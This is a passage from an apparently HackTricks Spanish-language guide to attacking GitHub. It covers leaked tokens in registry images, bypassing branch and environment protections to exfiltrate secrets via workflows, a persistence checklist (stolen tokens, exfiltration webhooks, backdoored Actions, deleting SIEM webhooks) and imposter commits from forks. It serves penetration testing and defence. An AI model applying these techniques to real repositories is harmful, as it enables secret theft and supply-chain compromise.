Para obtener más información y opciones de defensa (como codificar en duro el artefacto a descargar), consulta [https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust](https://www.legitsecurity.com/blog/artifact-poisoning-vulnerability-discovered-in-rust)
### Secuestro de repositorio de espacio de nombres eliminado

Este es un buen artículo para leer sobre vulnerabilidades corregidas que permitirían a un atacante robar un espacio de nombres eliminado para robar un repositorio famoso (potencialmente debido a un cambio de nombre del espacio de nombres): [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

### Registro de imágenes Docker de Github

Es posible crear acciones de Github que **compilen y almacenen una imagen Docker dentro de Github**.\
Un ejemplo se puede encontrar en el siguiente desplegable:

<details>

<summary>Acción de Github para compilar y enviar una imagen Docker</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Como pudiste ver en el código anterior, el registro de Github está alojado en **`ghcr.io`**.

Un usuario con permisos de lectura sobre el repositorio podrá descargar la imagen de Docker utilizando un token de acceso personal:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
A continuación, el usuario podría buscar **secretos filtrados en las capas de la imagen Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

## Bypass de Protección de Ramas

* **Requerir un número de aprobaciones**: Si comprometes varias cuentas, puedes aceptar tus PR desde otras cuentas. Si solo tienes acceso a la cuenta desde la cual creaste el PR, no puedes aceptar tu propio PR. Sin embargo, si tienes acceso a un entorno de **Github Action** dentro del repositorio, utilizando el **GITHUB\_TOKEN**, es posible que puedas **aprobar tu PR** y obtener una aprobación de esta manera.
* _Nota para esto y para la restricción de propietarios de código, por lo general, un usuario no podrá aprobar sus propios PR, pero si puedes hacerlo, puedes abusar de ello para aceptar tus PR._
* **Descartar aprobaciones cuando se envían nuevos commits**: Si esto no está configurado, puedes enviar código legítimo, esperar a que alguien lo apruebe y luego agregar código malicioso y fusionarlo en la rama protegida.
* **Requerir revisiones de los propietarios de código**: Si esto está activado y eres un propietario de código, puedes hacer que una **Github Action cree tu PR y luego aprobarlo tú mismo**.
* Cuando un archivo **CODEOWNER está mal configurado**, Github no se queja pero no lo utiliza. Por lo tanto, si está mal configurado, **no se aplica la protección de propietarios de código**.
* **Permitir que actores especificados eviten los requisitos de pull request**: Si eres uno de estos actores, puedes evitar las protecciones de pull request.
* **Incluir administradores**: Si esto no está configurado y eres administrador del repositorio, puedes evitar estas protecciones de rama.
* **Secuestro de PR**: Podrías ser capaz de **modificar el PR de otra persona** agregando código malicioso, aprobando el PR resultante tú mismo y fusionando todo.
* **Eliminar protecciones de rama**: Si eres un **administrador del repositorio, puedes desactivar las protecciones**, fusionar tu PR y volver a configurar las protecciones.
* **Bypass de protecciones de push**: Si un repositorio **solo permite que ciertos usuarios** envíen push (fusionar código) en las ramas (la protección de la rama podría estar protegiendo todas las ramas especificando el comodín `*`).
* Si tienes **acceso de escritura al repositorio pero no se te permite enviar código** debido a la protección de la rama, aún puedes **crear una nueva rama** y dentro de ella crear una **github action que se active cuando se envía código**. Como la **protección de la rama no protegerá la rama hasta que se cree**, este primer envío de código a la rama **ejecutará la github action**.

## Bypass de Protecciones de Entornos

Para obtener una introducción sobre [**Github Environment, consulta la información básica**](basic-github-information.md#git-environments).

En caso de que se pueda **acceder a un entorno desde todas las ramas**, no está **protegido** y puedes acceder fácilmente a los secretos dentro del entorno. Ten en cuenta que es posible que encuentres repositorios donde **todas las ramas estén protegidas** (especificando sus nombres o utilizando `*`), en ese escenario, **encuentra una rama en la que puedas enviar código** y puedes **filtrar** los secretos creando una nueva github action (o modificando una existente).

Ten en cuenta que es posible que encuentres el caso extremo donde **todas las ramas estén protegidas** (mediante el comodín `*`) y se especifique **quién puede enviar código a las ramas** (_puedes especificarlo en la protección de la rama_) y **tu usuario no está permitido**. Aún puedes ejecutar una github action personalizada porque puedes crear una rama y usar el disparador de envío sobre sí misma. La **protección de la rama permite el envío a una nueva rama, por lo que se activará la github action**.
```yaml
push: # Run it when a push is made to a branch
branches:
- current_branch_name #Use '**' to run when a push is made to any branch
```
Ten en cuenta que **después de la creación** de la rama, la **protección de la rama se aplicará a la nueva rama** y no podrás modificarla, pero para ese momento ya habrás filtrado las contraseñas.

## Persistencia

* Generar un **token de usuario**
* Robar **tokens de Github** de los **secretos**
* **Eliminar** los **resultados** y las **ramas** del flujo de trabajo
* Dar **más permisos a toda la organización**
* Crear **webhooks** para exfiltrar información
* Invitar a **colaboradores externos**
* **Eliminar** los **webhooks** utilizados por el **SIEM**
* Crear/modificar una **Acción de Github** con una **puerta trasera**
* Encontrar una **Acción de Github vulnerable a la inyección de comandos** mediante la modificación del valor del **secreto**

### Commits de impostores - Puerta trasera a través de commits del repositorio

En Github es posible **crear una solicitud de extracción (PR) a un repositorio desde un fork**. Incluso si la PR no es **aceptada**, se creará un identificador de **commit** en el repositorio original para la versión del código del fork. Por lo tanto, un atacante **podría fijarse en utilizar un commit específico de un repositorio aparentemente legítimo que no fue creado por el propietario del repositorio**.

Como [**este**](https://github.com/actions/checkout/commit/c7d749a2d57b4b375d1ebcd17cfbfb60c676f18e):
```yaml
name: example
on: [push]
jobs:
commit:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@c7d749a2d57b4b375d1ebcd17cfbfb60c676f18e
- shell: bash
run: |
echo 'hello world!'
```
Para obtener más información, consulta [https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd](https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd)

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si deseas ver tu **empresa anunciada en HackTricks** o si deseas acceder a la **última versión de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop).
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>
